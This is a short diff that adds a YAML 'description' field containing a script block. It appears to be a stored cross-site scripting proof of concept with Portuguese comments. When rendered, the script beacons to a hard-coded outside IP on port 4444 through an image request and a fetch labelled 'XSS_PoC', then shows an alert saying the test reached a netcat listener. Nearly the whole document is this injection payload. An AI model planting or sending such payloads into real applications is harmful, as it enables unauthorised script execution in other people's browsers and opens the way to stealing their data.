@@ -1,0 +1,14 @@
+description: |
+  <script>
+    // Teste básico de HTTP para sua porta 4444
+    var testImage = new Image();
+    testImage.src = 'http://38.242.197.128:4444/?test=' + Date.now();
+    
+    // Tentar via fetch também
+    fetch('http://38.242.197.128:4444/xss_test', {
+      mode: 'no-cors',
+      headers: {'X-Test': 'XSS_PoC'}
+    });
+    
+    alert('Sent HTTP test to your nc server');
+  </script>
